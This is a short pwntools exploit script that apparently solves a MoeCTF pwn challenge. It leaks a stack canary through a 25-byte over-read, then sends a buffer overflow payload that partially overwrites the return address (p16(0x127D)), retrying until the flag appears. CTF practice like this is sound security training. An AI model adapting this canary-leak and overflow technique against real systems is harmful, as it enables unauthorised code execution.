from pwn import *

context(arch='amd64', os='linux')
#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-v']

LOCAL = False
while True:
    if LOCAL:
        p = process('./pwn')
    else:
        p = remote('127.0.0.1', 42541)

    #gdb.attach(p, 'b vuln')

    p.sendafter(b'over you.\n', b'a'*25)
    p.recvuntil(b'a'*25)
    canary = b'\x00' + p.recv(7)
    log.success(f'Canary: {canary}')

    payload = b'a'*24 + canary + b'a'*8 + p16(0x127D)
    p.send(payload)
    # p.interactive()
    # break
    out = p.recvall(1)
    if out.find(b'moectf')!= -1:
        print(out)
        break
    else:
        p.close()
        continue